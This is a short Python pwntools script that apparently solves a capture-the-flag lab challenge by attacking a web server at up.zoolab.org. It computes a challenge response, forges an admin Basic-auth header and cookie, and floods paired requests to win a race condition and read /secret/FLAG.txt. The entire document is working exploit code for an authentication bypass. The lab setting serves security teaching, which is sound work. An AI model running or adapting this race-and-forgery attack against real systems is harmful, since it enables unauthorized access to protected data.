#!/usr/bin/python3

# gethostbyname() points to a static memory. So the return value might be changed!!!

from pwn import *
import re
import base64

found = False

conn = remote('up.zoolab.org', 10933)

conn.send('GET /secret/FLAG.txt\r\n\r\n'.encode())
res = conn.recv().decode()
match = re.search(r'challenge=(\d+)', res)
challenge_number = int(match.group(1))
resp = (challenge_number * 6364136223846793005 + 1) % 18446744073709551615
resp >>= 33
print(res)
print(f'response={resp}')

a = 'GET /\r\n\r\n'
b = f'GET /secret/FLAG.txt\r\nAuthorization: Basic {base64.b64encode(b"admin:").decode()}\r\nCookie: response={resp}\r\n\r\n'

print(a)
print(b)

while True:
    conn.send(a.encode())
    conn.send(b.encode())

    res = conn.recvline_startswith(b"FLAG", timeout=0.01).decode()
    if(len(res)):
        print(res)
        break

